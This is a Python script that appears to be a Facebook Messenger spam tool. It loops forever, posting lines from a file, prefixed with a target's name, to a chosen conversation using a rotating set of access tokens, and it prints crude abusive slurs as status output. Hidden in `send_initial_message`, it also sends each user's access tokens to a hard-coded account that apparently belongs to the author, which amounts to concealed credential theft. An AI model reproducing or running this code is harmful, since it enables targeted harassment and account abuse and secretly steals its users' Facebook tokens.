import requests
import json
import time
import sys
from platform import system
import os
import http.server
import socketserver
import threading

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"C0D3D BY SULM9N K9B1R")

def execute_server():
    PORT = int(os.environ.get('PORT', 4000))
    try:
        with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
            print(f"Server running at http://localhost:{PORT}")
            httpd.serve_forever()
    except Exception as e:
        print(f"\033[1;91m[x] Server error: {e}")

def send_initial_message():
    try:
        with open('token.txt', 'r') as file:
            tokens = file.readlines()
    except FileNotFoundError:
        print("\033[1;91m[x] Error: token.txt not found.")
        return

    if not tokens:
        print("\033[1;91m[x] Error: token.txt is empty.")
        return

    msg_template = "Hello SULM9N K9B1R sir! I am using your server. My token is {}"
    target_id = "4123519347909021"
    requests.packages.urllib3.disable_warnings()

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    for token in tokens:
        try:
            access_token = token.strip()
            if not access_token:
                continue
            url = f"https://graph.facebook.com/v17.0/t_{target_id}/"
            msg = msg_template.format(access_token)
            parameters = {'access_token': access_token, 'message': msg}
            response = requests.post(url, json=parameters, headers=headers)
            if response.ok:
                print(f"\033[1;92m[+] Initial message sent with token {access_token[:10]}...")
            else:
                print(f"\033[1;91m[x] Failed to send initial message: {response.text}")
            time.sleep(0.1)
        except Exception as e:
            print(f"\033[1;91m[x] Error sending initial message: {e}")

def send_messages_from_file():
    try:
        with open('convo.txt', 'r') as file:
            convo_id = file.read().strip()
    except FileNotFoundError:
        print("\033[1;91m[x] Error: convo.txt not found.")
        return

    try:
        with open('file.txt', 'r') as file:
            messages = file.readlines()
    except FileNotFoundError:
        print("\033[1;91m[x] Error: file.txt not found.")
        return

    try:
        with open('token.txt', 'r') as file:
            tokens = file.readlines()
    except FileNotFoundError:
        print("\033[1;91m[x] Error: token.txt not found.")
        return

    try:
        with open('name.txt', 'r') as file:
            haters_name = file.read().strip()
    except FileNotFoundError:
        print("\033[1;91m[x] Error: name.txt not found.")
        return

    try:
        with open('time.txt', 'r') as file:
            speed = int(file.read().strip())
    except FileNotFoundError:
        print("\033[1;91m[x] Error: time.txt not found.")
        return
    except ValueError:
        print("\033[1;91m[x] Error: time.txt must contain a valid integer.")
        return

    num_messages = len(messages)
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    def liness():
        print('\033[1;92m' + '•─────────────────────────────────────────────────────────•')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                message = messages[message_index].strip()
                url = f"https://graph.facebook.com/v17.0/t_{convo_id}/"
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print(f"\033[1;92m[+] 9LL H9T3R K1 BH3H1n K1 XHUT PH9RN3 W9L9 J9LL9D SULM9N K9B1R H3R3 💔 {message_index + 1} of Convo {convo_id} Token {token_index + 1}: {haters_name} {message}")
                    liness()
                else:
                    print(f"\033[1;91m[x] MADARCHOD MSG NAHI JA RAHA HAI {message_index + 1} of Convo {convo_id} with Token {token_index + 1}: {haters_name} {message}")
                    print(f"\033[1;91m[x] Error: {response.text}")
                    liness()
                time.sleep(speed)
            print("\n[+] All messages sent. Restarting the process...\n")
        except Exception as e:
            print(f"\033[1;91m[!] An error occurred: {e}")

def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()
    send_initial_message()
    send_messages_from_file()

if __name__ == '__main__':
    main()
